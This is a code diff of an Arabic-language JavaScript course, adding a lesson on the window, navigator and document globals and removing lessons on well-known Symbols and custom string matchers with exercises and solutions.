-وفي الـ RegExp: [[str.split(re)]] و [[str.matchAll(re)]] بيعملوا **نسخة** من الـ regex بالـ species قبل ما يشتغلوا (عشان ميبوظوش [[lastIndex]] بتاعتك). اتجرّب بـ getter بيطبع:
+**[[var]] و [[function]] بيتحطوا على [[window]]، و [[let]] و [[const]] لأ:** [[window.shopName]] طلعت «متجر النور» لأن [[var]] برّه أي function في سكربت عادي (classic script) بيعمل خاصية على الـ global object. و [[window.visits]] طلعت [[undefined]] لأن [[let]] بيتحط في مكان تاني اسمه «global lexical scope»: متاح بالاسم من أي سكربت، بس مش خاصية على [[window]]. وفي [[<script type="module">]] ولا واحد منهم بيوصل لـ [[window]].
 
-| النداء | سأل عن [[ [Symbol.species] ]]؟ |
+**فخ ١: الأسامي المحجوزة.** [[window]] عليه مئات الخصايص الجاهزة. [[var name = 42]] بيكتب على [[window.name]] اللي بتحوّل لنص، فـ [[typeof name]] بقى [["string"]] (اتجرّب في «جرّب»). [[var status = 5]] نفس الكلام.
+
+**فخ ٢: العناصر اللي ليها [[id]] بتبقى global.** صفحة فيها [[<div id="cart">]]:
+
+~~~js
+console.log(window.cart.textContent, cart === document.getElementById("cart"));
+~~~
+
+~~~text الناتج
+السلة true
+~~~
+
+ده سلوك قديم اسمه «named access on window». متعتمدش عليه: لو حد عمل [[var cart]] أو ضاف عنصر تاني بنفس الـ id، الكود يبوظ. دايمًا [[document.querySelector("#cart")]].
+
+### الحاجات اللي بتستخدمها كل يوم من [[window]]
+
+| الخاصية | بترجّع | الناتج عندنا |
+|---|---|---|
+| [[innerWidth]] و [[innerHeight]] | مقاس الجزء اللي الصفحة بتترسم فيه بالـ CSS pixels | [[1280 720]] |
+| [[devicePixelRatio]] | كام pixel حقيقي في كل CSS pixel | [[1.25]] على لابتوب بزوم ويندوز ١٢٥٪ |
+| [[scrollX]] و [[scrollY]] و [[scrollTo()]] | الـ scroll الحالي، وتحرّكه | [[0]] |
+| [[location]] | العنوان: [[href]] و [[origin]] و [[pathname]] و [[search]] و [[hash]]، و [[assign()]] و [[replace()]] و [[reload()]] | [[/l1.html]] و [[http://localhost:8765]] |
+| [[history]] | [[back()]] و [[forward()]] و [[pushState()]] | درس «pushState و popstate» |
+| [[matchMedia()]] | نفس media queries بتاعة CSS من JS | [[matchMedia("(prefers-reduced-motion: reduce)").matches]] |
+| [[setTimeout]] و [[fetch]] و [[alert]] | دوال على [[window]] كمان | [[alert]] بيوقف الصفحة كلها لحد ما تقفله |
+
+والأحداث اللي بتخص التاب كله بتتسمع على [[window]]: [[resize]] و [[scroll]] و [[load]] و [[online]] و [[offline]] و [[storage]] و [[popstate]]. [[addEventListener("offline", ...)]] في سطر ٧ هو [[window.addEventListener]] من غير ما تكتب [[window.]].
+
+---
+
+## ٢. [[navigator]]: المتصفح والجهاز
+
+~~~text الناتج: سطر ٦ في المثال
+en-US ['en-US', 'en'] true
+~~~
+
+**[[navigator.language]] و [[navigator.languages]]:** اللغة الأولى اللي اليوزر مختارها في إعدادات المتصفح، واللستة كلها بالترتيب. دي البداية الصح لاختيار لغة الموقع (تمرين ٣)، وبعدين تديها لـ [[Intl]] (وحدة «Intl كامل»).
+
+**[[navigator.onLine]] والحدثين [[online]] و [[offline]]:** قطعنا النت عن التاب من Playwright، والـ listener اتنده:
+
+~~~text الناتج (Chrome 157، النت اتقطع ورجع)
+offline false
+online true
+~~~
+
+بس خلي بالك: [[onLine === true]] معناها «فيه شبكة»، مش «فيه انترنت». جهاز متوصل براوتر من غير انترنت بيقول [[true]]. الحقيقة الوحيدة إن طلب [[fetch]] فعلًا نجح. استخدمها عشان تعرض «انت أوفلاين» بسرعة، مش عشان تقرر إن السيرفر شغال.
+
+**[[navigator.userAgent]] ومتعملش «sniffing»:**
+
+~~~text الناتج
+Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/157.0.0.0 Safari/537.36
+~~~
+
+نص Chrome فيه «Mozilla» و «AppleWebKit» و «Safari»، لأسباب تاريخية: كل متصفح جديد كان بيقلّد نص اللي قبله عشان المواقع اللي بتفحص النص متقفلش في وشه. فـ [[userAgent.includes("Safari")]] بترجع [[true]] في Chrome (تمرين ٤). وكمان Chrome بقى يحط أرقام ثابتة ([[10.0]] و [[157.0.0.0]]) عشان يقلل التتبع. **القاعدة:** اسأل «الميزة موجودة؟» مش «المتصفح ده إيه؟»:
+
+~~~js
+if ("share" in navigator) { /* زرار المشاركة */ }
+if (navigator.clipboard?.writeText) { /* زرار النسخ */ }
+~~~
+
+**الباقي بوابات:** [[navigator.clipboard]] و [[navigator.geolocation]] و [[navigator.share]] (درس «Clipboard و Geolocation و Share»)، و [[navigator.permissions]] (درس «Notification و permissions»)، و [[navigator.serviceWorker]] (وحدة PWA)، و [[navigator.storage]] (درس «تختار تخزين إيه» في الوحدة دي)، و [[navigator.hardwareConcurrency]] (عدد الأنوية: [[16]] عندنا، مفيد لعدد الـ workers).
+
+---
+
+## ٣. [[document]]: الصفحة
+
+~~~text الناتج: آخر سطر في المثال، والسكربت في آخر body
+أجزاء المتصفح ar loading
+~~~
+
+**[[document.readyState]]** بيمشي ٣ مراحل: [["loading"]] (الـ HTML لسه بيتقرا، وده اللي شافه سكربت جوه الـ body)، وبعدين [["interactive"]] (الشجرة خلصت، وبعدها على طول [[DOMContentLoaded]])، وبعدين [["complete"]] (الصور والـ CSS خلصوا، وبعدها [[load]]). اتقاس في تمرين ٥:
+
+~~~text الناتج (Chrome 157)
+loading → interactive → DOMContentLoaded → complete → load
+~~~
+
+| الخاصية | إيه |
 |---|---|
-| [[ 'a-b-c'.split(r) ]] | أيوه، وعمل نسخة |
-| [[ [...'a-b'.matchAll(r)] ]] | أيوه، وعمل نسخة |
-| [[ 'a-b-c'.replace(r, '+') ]] | لأ، شغال على [[r]] نفسها |
+| [[document.documentElement]] | عنصر [[<html>]]، أول عنصر في الشجرة (درس «شجرة الـ DOM» الجاي) |
+| [[document.head]] و [[document.body]] | اختصارات للعنصرين |
+| [[document.title]] | النص اللي في التاب، وتقدر تغيّره |
+| [[document.URL]] و [[document.characterSet]] و [[document.contentType]] | [[http://localhost:8765/]] و [[UTF-8]] و [[text/html]] |
+| [[document.cookie]] | الكوكيز اللي JS مسموح يشوفها (درس «document.cookie») |
+| [[document.defaultView]] | يرجّعك لـ [[window]] من الـ document |
+
+---
+
+## ٤. نفس الأسامي في Node 24
+
+~~~text الناتج: node -e 'console.log(typeof window, typeof globalThis, typeof navigator, navigator.language, navigator.userAgent, typeof document, typeof location)'
+undefined object object en-US Node.js/24 undefined undefined
+~~~
+
+| | المتصفح | Node 24 |
+|---|---|---|
+| [[globalThis]] | [[window]] | [[global]] |
+| [[window]] و [[document]] و [[location]] | موجودين | [[undefined]] (مفيش صفحة) |
+| [[navigator]] | كامل | من Node 21: [[language]] و [[languages]] و [[userAgent]] و [[platform]] و [[hardwareConcurrency]] و [[locks]] بس |
+
+فكود مشترك بين الاتنين يفحص: [[typeof document !== "undefined"]] قبل ما يلمس الصفحة.
 
 ---
 
 ## الخلاصة
 
-- ١٣ well-known symbol، كل واحد سؤال من حتة معيّنة في اللغة (الجدول في القسم ١).
-- [[Symbol.toStringTag]] بيغيّر [[[object X]]] وعرض Node، ومبيغيّرش النوع: متفحصش بيه.
-- [[Symbol.isConcatSpreadable]] لـ [[concat]] بس، لا spread ولا [[flat]].
-- [[Symbol.species]] بيقرر class النتايج المشتقة في [[then]] و [[map]] و [[split]].`,
-          lines: [
-            R`دالة صغيرة بتنادي [[Object.prototype.toString]] الأصلية على أي قيمة بـ [[.call]]، عشان نشوف الـ tag.`,
-            R`بيطبع [[[object Array]]] و [[[object Map]]] و [[[object Promise]]] و [[[object Null]]]: كل واحد من الـ tag بتاعه أو حالة خاصة.`,
-            R`class هنعلّمها بـ Symbols جاهزة من اللغة.`,
-            R`حقل عادي فيه المنتجات، هنلف عليه بعد شوية.`,
-            R`getter بالـ Symbol [[toStringTag]]: أي حد يسأل «انت نوعك إيه» كنص هياخد [['Cart']].`,
-            R`[[Symbol.iterator]] بيرجّع iterator على الـ array الداخلية، فالـ [[Cart]] بقت تتلف بـ spread و [[for...of]].`,
-            R`قفلة الـ class: الاتنين على الـ prototype، فكل instance بتورثهم.`,
-            R`instance من الـ class.`,
-            R`[[[object Cart]]] مرتين (من الـ tag)، والـ spread طلّع [[[ 'tea', 'rice' ]]] من الـ iterator.`,
-            R`array-like (فيه [[length]] وأرقام) وقال لـ [[concat]] «افردني» بـ [[isConcatSpreadable: true]].`,
-            R`الأول اتفرد [[[ 1, 'a', 'b' ]]]، والتاني array عادية اتفردت بالافتراضي [[[ 1, 2, 3 ]]].`,
-            R`array عادية هنقولها متتفردش.`,
-            R`[[false]] على الـ array نفسها: [[concat]] هيحطها كعنصر واحد.`,
-            R`الطول 2: الـ [[1]] والـ array كلها كعنصر.`,
-            R`subclass فاضية من [[Promise]] من غير أي species.`,
-            R`[[true]] لأن [[then]] عملت النتيجة من الـ species اللي هو الـ class نفسها، و [[ Promise[Symbol.species] ]] بيرجّع [[Promise]] نفسها.`,
-          ],
-          ref: [
-            { t: "MDN: Symbol (well-known symbols)", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol#well-known_symbols" },
-            { t: "MDN: Symbol.toStringTag", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/toStringTag" },
-            { t: "MDN: Symbol.isConcatSpreadable", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/isConcatSpreadable" },
-            { t: "MDN: Symbol.species", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Symbol/species" },
-            { t: "MDN: Promise[Symbol.species]", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Promise/Symbol.species" },
-            { t: "MDN: RegExp[Symbol.species]", url: "https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/RegExp/Symbol.species" },
-            { t: "ECMAScript: Well-Known Symbols", url: "https://tc39.es/ecma262/multipage/ecmascript-data-types-and-values.html#sec-well-known-symbols" },
-          ],
-          pre: ["js/Symbol: description و Symbol.for و Symbol.keyFor", { to: "js/Array[Symbol.species] و Symbol.unscopables", why: R`الـ species على الـ arrays و [[unscopables]]` }, { to: "js/class", why: R`الـ getters والـ static في الـ class` }],
-        },
-        {
-          cmd: "RegExp و Symbol.match و Symbol.replace: matcher بتاعك",
-          title: "str.replace و split و search و match بيسلّموا الشغل لمين؟ وتعمل matcher بتاعك من غير regex",
-          desc: R`[[str.replace(x, ...)]] و [[str.split(x)]] و [[str.search(x)]] و [[str.match(x)]] و [[str.matchAll(x)]] مش بيعرفوا regex أصلًا: بيسألوا الـ argument [[x]] «عندك method بالـ Symbol ده؟» ([[Symbol.replace]] و [[Symbol.split]] و [[Symbol.search]] و [[Symbol.match]] و [[Symbol.matchAll]]). لو عنده، بينادوها ويرجّعوا نتيجتها. والـ [[RegExp]] هو بس أشهر object عنده الخمسة: [[ RegExp.prototype[Symbol.replace] ]] وأخواتها.
-
-فتقدر تعمل object أو class بتاعتك تتبعت لـ [[replace]] و [[split]] زي الـ regex بالظبط (قايمة كلمات ممنوعة، glob زي [[*.js]]، تاريخ)، أو subclass من [[RegExp]] تغيّر سلوك [[split]] بس.
-
-و [[Symbol.match]] ليه شغلانة تانية: [[startsWith]] و [[includes]] و [[endsWith]] بيسألوه عشان يعرفوا لو الـ argument «regex» فيرفضوه. ولو حطيته [[false]] على regex، بيتعامل كنص.`,
-          example: R`// str.search و replace و split بيسلّموا الشغل للـ argument لو عنده الـ Symbol
-const dash = {
-  [Symbol.search](s) { return s.indexOf('-'); },
-  [Symbol.replace](s, rep) { return s.split('-').join(rep); },
-  [Symbol.split](s, limit) { return s.split('-', limit); },
-};
-const sku = 'TEA-500-EG';
-console.log(sku.search(dash), sku.replace(dash, '/'), sku.split(dash, 2));
-const re = /(\d+)/g;
-console.log(re[Symbol.replace](sku, '[$1]'), RegExp.prototype[Symbol.split].call(/-/, sku));
-console.log(/\d+/[Symbol.search](sku), [...re[Symbol.matchAll](sku)].map((m) => m[1]), re[Symbol.match](sku));
-try { sku.startsWith(/TEA/); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-const literal = /TEA/;
-literal[Symbol.match] = false;
-console.log('/TEA/x'.startsWith(literal), String(literal));`,
-          try: R`اعمل [[class CleanSplit extends RegExp]] فيها [[ [Symbol.split](str, limit) ]] بتنادي النسخة الأصلية ([[RegExp.prototype[Symbol.split].call(this, str, limit)]]) وبعدين تعمل [[trim]] لكل جزء وتشيل الفاضي. جرّبها على [[' tea , rice,, milk '.split(new CleanSplit(','))]] وقارن بـ [[split(/,/)]].`,
-          sol: R`~~~js clean-split.mjs
-class CleanSplit extends RegExp {
-  [Symbol.split](str, limit) {
-    return RegExp.prototype[Symbol.split].call(this, str, limit).map((s) => s.trim()).filter(Boolean);
-  }
-}
-console.log(' tea , rice,, milk '.split(new CleanSplit(',')));
-console.log(' tea , rice,, milk '.split(/,/));
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 'tea', 'rice', 'milk' ]
-[ ' tea ', ' rice', '', ' milk ' ]
-~~~
-
-- [[str.split(x)]] لقى [[ x[Symbol.split] ]] على الـ prototype بتاع [[CleanSplit]] فنادى نسختنا.
-- جوه، [[RegExp.prototype[Symbol.split].call(this, ...)]] بينادي الأصلية على نفس الـ regex. ليه مش [[str.split(this)]]؟ لأنها هتنادي نسختنا تاني، وتفضل تنادي نفسها لحد [[RangeError: Maximum call stack size exceeded]].
-- الـ subclass لسه regex كامل: [[test]] و [[exec]] و [[replace]] شغالين عادي، اتغيّر [[split]] بس.`,
-          practice: [
-            { lvl: 'سريع', t: R`**اقرا وتوقّع:** object فيه الأربعة بيرجّعوا اسمهم. إيه اللي هيتطبع في كل سطر؟
-
-~~~js
-const spy = {
-  [Symbol.match]() { return ['match']; },
-  [Symbol.replace]() { return 'replace'; },
-  [Symbol.search]() { return 'search'; },
-  [Symbol.split]() { return ['split']; },
-};
-console.log('abc'.match(spy), 'abc'.replace(spy, 'x'), 'abc'.search(spy), 'abc'.split(spy));
-try { console.log('abc'.replaceAll(spy, 'x')); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-try { console.log('abc'.includes(spy)); } catch (e) { console.log(e.constructor.name + ': ' + e.message); }
-~~~`, done: R`توقّعت السطر الأول، وعرفت ليه [[replaceAll]] و [[includes]] وقعوا مع إن الـ object مش regex.`, sol: R`~~~text الناتج (Node 24.22)
-[ 'match' ] replace search [ 'split' ]
-TypeError: String.prototype.replaceAll called on null or undefined
-TypeError: First argument to String.prototype.includes must not be a regular expression
-~~~
-
-- السطر الأول: كل string method نادت الـ method بتاعتها ورجّعت نتيجتها زي ما هي، حتى لو مش منطقية ([[search]] رجّعت نص مش رقم).
-- [[replaceAll]] و [[matchAll]] قبل ما ينادوا الـ Symbol بيسألوا: «الـ argument ده regex؟» والإجابة بتيجي من [[Symbol.match]]: الـ [[spy]] عنده [[Symbol.match]]، فاتعامل كـ regex، فقرا [[spy.flags]] عشان يتأكد إن فيه [[g]]، لقاه [[undefined]] فرمى. والرسالة نفسها مضللة ([[called on null or undefined]]): في V8 دي رسالة فحص الـ flags.
-- [[includes]] نفس السؤال: «regex؟ ارفض». فوجود [[Symbol.match]] على object بيغيّر سلوك ٥ methods مش واحدة.` },
-            { lvl: 'تطبيق', t: R`**ابني:** [[class Words]] بتاخد كلمات ([[new Words('spam', 'free money')]]) وبتشتغل مع [[str.search]] و [[str.replace]] (بنص أو بدالة) و [[str.split]]، والمقارنة **case-insensitive**، ومن غير ما تبني regex (عشان الكلمات ممكن يبقى فيها [[.]] أو [[*]]).`, done: R`[[msg.replace(banned, '***')]] بيخفي [[FREE MONEY]] و [[Spam]] و [[spam]]، و [[replace]] بدالة بتاخد النص الأصلي بحروفه، و [[split]] بيقسم عندهم، و [['a.b*c'.replace(new Words('.', '*'), '_')]] بـ [['a_b_c']]، والتمرين اللي بيتصحح لوحده عدّى.`, sol: R`~~~js words.mjs
-export class Words {
-  constructor(...words) { this.words = words.map((w) => w.toLowerCase()); }
-  #hits(str) {
-    const lower = str.toLowerCase(), hits = [];
-    for (let pos = 0; pos < lower.length; ) {
-      const word = this.words.find((w) => lower.startsWith(w, pos));
-      if (word) { hits.push({ index: pos, text: str.slice(pos, pos + word.length) }); pos += word.length; }
-      else pos++;
-    }
-    return hits;
-  }
-  [Symbol.search](str) { return this.#hits(str)[0]?.index ?? -1; }
-  [Symbol.replace](str, rep) {
-    let out = '', last = 0;
-    for (const { index, text } of this.#hits(str)) {
-      out += str.slice(last, index) + (typeof rep === 'function' ? rep(text, index) : rep);
-      last = index + text.length;
-    }
-    return out + str.slice(last);
-  }
-  [Symbol.split](str) {
-    const parts = [];
-    let last = 0;
-    for (const { index, text } of this.#hits(str)) { parts.push(str.slice(last, index)); last = index + text.length; }
-    parts.push(str.slice(last));
-    return parts;
-  }
-}
-const banned = new Words('spam', 'free money');
-const msg = 'Get FREE MONEY now, no Spam (a.k.a. spam).';
-console.log(msg.search(banned));
-console.log(msg.replace(banned, '***'));
-console.log(msg.replace(banned, (t) => '[' + t.length + ']'));
-console.log(msg.split(banned));
-console.log('a.b*c'.replace(new Words('.', '*'), '_'), 'clean text'.search(banned));
-~~~
-
-~~~text الناتج (Node 24.22)
-4
-Get *** now, no *** (a.k.a. ***).
-Get [10] now, no [4] (a.k.a. [4]).
-[ 'Get ', ' now, no ', ' (a.k.a. ', ').' ]
-a_b_c -1
-~~~
-
-**الشرح:** كل الشغل في [[#hits]]: بيلف على النص مرة واحدة، وعند كل مكان بيسأل «فيه كلمة بتبدأ هنا؟» بـ [[startsWith(w, pos)]] على النسخة الصغيرة، ويرجّع المكان والنص **الأصلي** بحروفه (عشان الدالة في [[replace]] تاخد [['FREE MONEY']] زي ما هي). والـ methods التلاتة مبنية عليها. ومفيش [[Symbol.match]] بقصد: لو حطيناها، [[includes]] و [[replaceAll]] هيعتبروا الـ object regex (التمرين اللي فات). **الغلطة الشائعة:** تبني [[new RegExp(words.join('|'), 'gi')]] على طول، فـ [['.']] تبقى «أي حرف» وتمسح النص كله.` },
-            { lvl: 'تطبيق', t: R`**ابني:** استخدم [[ RegExp.prototype[Symbol.replace] ]] و [[ [Symbol.split] ]] و [[ [Symbol.search] ]] **مباشرة** (من غير [[str.replace]]) على [[/(\d+)/g]] و [[/-/]] و [[/\d+/]] و [[ 'TEA-500-EG' ]]، وقارن الناتج بالـ string methods العادية.`, done: R`طلع [[TEA-[500]-EG]] و [[[ 'TEA', '500', 'EG' ]]] و [[4]] بالطريقتين، وتعرف إن [[str.replace(re, ...)]] هو نفسه [[ re[Symbol.replace](str, ...) ]].`, sol: R`~~~js direct.mjs
-const sku = 'TEA-500-EG';
-const re = /(\d+)/g;
-console.log(re[Symbol.replace](sku, '[$1]'), sku.replace(re, '[$1]'));
-console.log(/-/[Symbol.split](sku), sku.split(/-/));
-console.log(/\d+/[Symbol.search](sku), sku.search(/\d+/));
-~~~
-
-~~~text الناتج (Node 24.22)
-TEA-[500]-EG TEA-[500]-EG
-[ 'TEA', '500', 'EG' ] [ 'TEA', '500', 'EG' ]
-4 4
-~~~
-
-**الشرح:** المواصفة بتقول [[String.prototype.replace]] أول خطوة فيها: لو الـ argument مش [[null]] ولا [[undefined]]، هات [[ arg[Symbol.replace] ]] ولو موجودة ناديها بـ [[(string, replaceValue)]]. فالنتيجتين واحد بالظبط. الفايدة العملية: لما تعمل subclass وعايز تنادي السلوك الأصلي من جوه (زي [[CleanSplit]] في «جرّب»).` },
-            { lvl: 'تحدي', t: R`**صلّح الكود البايظ:** الـ matcher ده عنده [[Symbol.match]] و [[Symbol.matchAll]]، و [[match]] شغال بس [[matchAll]] بيقع. اقرا الرسالة وصلّح بطريقتين:
-
-~~~js
-const words = { [Symbol.match](s) { return s.match(/\w+/g); }, [Symbol.matchAll](s) { return s.matchAll(/\w+/g); } };
-console.log('hi there'.match(words));
-console.log([...'hi there'.matchAll(words)].map((m) => m[0]));
-~~~`, done: R`[[matchAll]] بيطبع [[[ 'hi', 'there' ]]]، وتقدر تشرح ليه وجود [[Symbol.match]] هو السبب.`, sol: R`~~~text الناتج قبل التصليح (Node 24.22)
-[ 'hi', 'there' ]
-TypeError: The .flags property of the argument to String.prototype.matchAll cannot be null or undefined
-~~~
-
-[[matchAll]] قبل ما ينادي [[Symbol.matchAll]] بيعمل IsRegExp: «الـ argument عنده [[Symbol.match]] truthy؟». أيوه، فبيعتبره regex، وبعدين لازم يتأكد إن فيه [[g]] في [[flags]] (عشان [[matchAll]] من غير [[g]] ممنوع). ملقاش [[flags]] خالص فرمى.
-
-~~~js fixed.mjs
-const words = { [Symbol.match](s) { return s.match(/\w+/g); }, [Symbol.matchAll](s) { return s.matchAll(/\w+/g); } };
-words.flags = 'g';
-console.log([...'hi there'.matchAll(words)].map((m) => m[0]));
-~~~
-
-~~~text الناتج (Node 24.22)
-[ 'hi', 'there' ]
-~~~
-
-**الطريقتين:** (١) زوّد [[flags: 'g']] زي ما اتعمل فوق، يعني «أنا regex global». (٢) لو الـ object مش محتاج [[str.match]] أصلًا، شيل [[Symbol.match]]: من غيره IsRegExp بيقول لأ، و [[matchAll]] بينادي [[Symbol.matchAll]] على طول (اتجرّب: object فيه [[Symbol.matchAll]] بس اشتغل من غير [[flags]]). وبالمرة [[includes]] و [[startsWith]] مش هيرفضوه.` },
-            { lvl: 'تحدي', t: R`**قارن وقيس:** نفس قايمة الكلمات الممنوعة بطريقتين: [[Words]] من التمرين فوق، و regex مبني بـ [[RegExp.escape]] و [[gi]]. شغّلهم على نص ١.٤ مليون حرف وقيس الوقت، وتأكد إن الناتج واحد.`, done: R`الناتجين متساويين ([[true]])، وعندك رقمين بالـ ms، وتقدر تقول إمتى تختار كل واحد.`, sol: R`~~~js compare.mjs
-import { Words } from './words.mjs';
-const list = ['spam', 'free money', 'click here', 'winner', '$$$'];
-const text = 'Hello friend, you are a WINNER of free money. Click here! $$$ no spam. '.repeat(20000);
-const asRegex = new RegExp(list.map(RegExp.escape).join('|'), 'gi');
-let t = performance.now();
-const a = text.replace(new Words(...list), '***');
-const tw = performance.now() - t;
-t = performance.now();
-const b = text.replace(asRegex, '***');
-const tr = performance.now() - t;
-console.log('same result:', a === b, 'length', text.length);
-console.log('Words matcher', tw.toFixed(1) + 'ms', '| RegExp.escape + gi', tr.toFixed(1) + 'ms');
-console.log(asRegex.source);
-~~~
-
-~~~text الناتج (Node 24.22، والمرات التانية: 63.3 و 65.8 و 67.3 مقابل 4.1 و 4.5 و 3.8)
-4
-Get *** now, no *** (a.k.a. ***).
-Get [10] now, no [4] (a.k.a. [4]).
-[ 'Get ', ' now, no ', ' (a.k.a. ', ').' ]
-a_b_c -1
-same result: true length 1420000
-Words matcher 58.0ms | RegExp.escape + gi 3.6ms
-\x73pam|\x66ree\x20money|\x63lick\x20here|\x77inner|\$\$\$
-~~~
-
-أول ٥ سطور جايين من [[words.mjs]] نفسه: الـ [[import]] بيشغّل الملف كله، ومعاه سطور التجربة اللي في آخره (شيلها لو هتستخدمه كـ module بجد). **القراءة:** الـ regex أسرع حوالي ١٥ مرة، لأن محرك الـ regex مكتوب C++ ومتحسّن للبحث، و [[Words]] بتعمل [[find]] على كل الكلمات عند كل حرف. فلو الكلمات نصوص ثابتة، [[RegExp.escape]] (لاحظ إنه بيحوّل أول حرف و المسافة لـ [[\x..]] عشان الأمان) هو الاختيار. الـ matcher بتاعك يكسب لما المنطق **مش** regex أصلًا: مطابقة بالتشكيل أو من غيره، أو مرادفات من قاعدة بيانات، أو glob، أو تحب [[replace]] تاخد object غني. وساعتها تقدر تحسّن جواه (trie مثلًا) من غير ما الكود اللي بيستخدمه يتغيّر.` },
-          ],
-          check: { lang: "js", starter: R`class Words {
-  constructor(...words) { this.words = words.map((w) => w.toLowerCase()); }
-  // [Symbol.search] و [Symbol.replace] و [Symbol.split]، من غير RegExp
-}`, tests: R`const banned = new Words('spam', 'free money');
-const msg = 'Get FREE MONEY now, no Spam (a.k.a. spam).';
-test("search", () => expect(msg.search(banned)).toBe(4));
-test("search مش لاقي", () => expect('clean'.search(banned)).toBe(-1));
-test("replace بنص", () => expect(msg.replace(banned, '***')).toBe('Get *** now, no *** (a.k.a. ***).'));
-test("replace بدالة بتاخد النص الأصلي", () => expect(msg.replace(banned, (t) => '<' + t + '>')).toBe('Get <FREE MONEY> now, no <Spam> (a.k.a. <spam>).'));
-test("split", () => expect(msg.split(banned)).toEqual(['Get ', ' now, no ', ' (a.k.a. ', ').']));
-test("رموز من غير regex", () => expect('a.b*c'.replace(new Words('.', '*'), '_')).toBe('a_b_c'));`, solution: R`class Words {
-  constructor(...words) { this.words = words.map((w) => w.toLowerCase()); }
-  #hits(str) {
-    const lower = str.toLowerCase(), hits = [];
-    for (let pos = 0; pos < lower.length; ) {
-      const word = this.words.find((w) => lower.startsWith(w, pos));
-      if (word) { hits.push({ index: pos, text: str.slice(pos, pos + word.length) }); pos += word.length; }
-      else pos++;
-    }
-    return hits;
-  }
-  [Symbol.search](str) { return this.#hits(str)[0]?.index ?? -1; }
-  [Symbol.replace](str, rep) {
-    let out = '', last = 0;
-    for (const { index, text } of this.#hits(str)) {
-      out += str.slice(last, index) + (typeof rep === 'function' ? rep(text, index) : rep);
-      last = index + text.length;
-    }
-    return out + str.slice(last);
-  }
-  [Symbol.split](str) {
-    const parts = [];
-    let last = 0;
-    for (const { index, text } of this.#hits(str)) { parts.push(str.slice(last, index)); last = index + text.length; }
-    parts.push(str.slice(last));
-    return parts;
-  }
-}` },
-          flag: "script",
-          deep: {
-            why: R`ده بيفسّر حاجات كانت شكلها سحر: ليه [[str.split(/,/)]] و [[str.split(',')]] الاتنين شغالين، وليه [[includes(/x/)]] بيرمي، وليه [[matchAll]] بيرمي من غير [[g]]. وبيفتح باب تصميم مهم: API بتاخد «أي حاجة تعرف تـ match»، فاللي بيستخدمها يبعت regex أو matcher بتاعه من غير ما الـ API تتغيّر. وده نفس اللي بتعمله مكتبات الـ glob والـ routing.`,
-            how: R`[[String.prototype.replace(searchValue, replaceValue)]] حسب المواصفة: لو [[searchValue]] مش [[undefined]] ولا [[null]]، بيعمل [[GetMethod(searchValue, @@replace)]]، ولو لقاها بيرجّع [[Call(replacer, searchValue, [O, replaceValue])]] من غير أي شغل تاني. لو ملقاش، بيحوّل [[searchValue]] لنص ويدوّر عليه كنص. ونفس الشكل في [[split]] (بـ [[limit]]) و [[search]] و [[match]] و [[matchAll]].
-
-و [[RegExp.prototype]] هو اللي عنده التنفيذ الحقيقي للخمسة، وكلهم مبنيين على [[exec]] (يعني لو عملت override لـ [[exec]] في subclass، الخمسة بيستخدموها). و [[split]] و [[matchAll]] بيعملوا نسخة من الـ regex بالـ [[Symbol.species]] (درس «well-known symbols»).
-
-و IsRegExp(arg) = لو مش object يبقى لأ، ولو [[ arg[@@match] ]] مش [[undefined]] خد قيمته كـ boolean، وإلا شوف لو هو RegExp حقيقي. بيستخدمه [[startsWith]] و [[endsWith]] و [[includes]] (عشان يرفضوا)، و [[matchAll]] و [[replaceAll]] (عشان يفحصوا [[g]])، و [[new RegExp(x)]] و [[RegExp(x)]].`,
-            when: R`matcher بتاعك: لما المنطق مش regex بطبيعته (قايمة كلمات ثابتة من اليوزر، glob، مطابقة عربي من غير تشكيل، أرقام تليفونات بكذا شكل) وعايز الكود اللي بيستخدمه يفضل [[str.replace(m, ...)]] العادي. subclass من [[RegExp]] بـ [[ [Symbol.split] ]] أو [[ [Symbol.replace] ]]: لما الـ regex صح بس عايز تعديل ثابت على النتيجة (trim، فلترة، log). [[ re[Symbol.match] = false ]]: نادر، لما regex محتاج يتبعت لكود بيعامله كنص. ولو بتدوّر على نص ثابت من اليوزر جوه نص، [[RegExp.escape]] أسرع (اتقاس في التمرين الأخير).`,
-            mistakes: R`- تنادي [[str.split(this)]] جوه [[ [Symbol.split] ]] بتاع subclass: recursion لحد [[Maximum call stack size exceeded]]. نادي [[RegExp.prototype[Symbol.split].call(this, ...)]].
-- تحط [[Symbol.match]] على matcher مش محتاجه: [[includes]] و [[startsWith]] بيبتدوا يرفضوه، و [[matchAll]] و [[replaceAll]] بيدوّروا على [[flags]].
-- تفتكر [[includes(/x/)]] بيدوّر بالـ regex: بيرمي [[First argument to String.prototype.includes must not be a regular expression]]. استخدم [[test]].
-- [[matchAll]] و [[replaceAll]] بـ regex من غير [[g]]: [[TypeError: String.prototype.matchAll called with a non-global RegExp argument]].
-- تفتكر [[Symbol.replace]] بتاخد الـ [[$1]] متحلّلة: بتاخد [[replaceValue]] زي ما اتبعت (نص فيه [[$1]] أو دالة)، والتعامل معاه شغلك.
-- [[str.replace(null, 'X')]] مبيدوّرش على Symbol: بيحوّل [[null]] لنص [['null']] (اتجرّب: [['nullnull'.replace(null, 'X')]] بـ [['Xnull']]).`,
-          },
-          teach: R`## الفكرة في سطر
-
-[[str.replace(x, ...)]] أول حاجة بتعملها: «يا [[x]]، عندك [[ [Symbol.replace] ]]؟ لو أيوه، اتفضل اعمل انت الشغل». والـ regex مجرد object عنده الإجابة. الناتج من Node 24.22.
-
----
-
-## ١. مين بينادي مين
-
-| الـ method في الـ RegExp | بيتنادى من | بيرجّع |
-|---|---|---|
-| [[ RegExp.prototype[Symbol.match] ]] | [[str.match(re)]] | array الـ match (من غير [[g]]) أو كل النصوص (بـ [[g]]) أو [[null]] |
